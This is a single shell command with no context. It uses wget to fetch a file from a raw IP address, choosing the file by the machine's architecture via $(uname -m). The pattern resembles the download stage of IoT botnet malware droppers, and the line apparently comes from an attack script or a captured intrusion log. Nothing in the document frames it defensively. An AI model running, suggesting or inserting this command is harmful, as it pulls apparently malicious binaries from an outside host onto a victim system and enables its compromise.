wget http://45.88.67.38/$(uname -m)
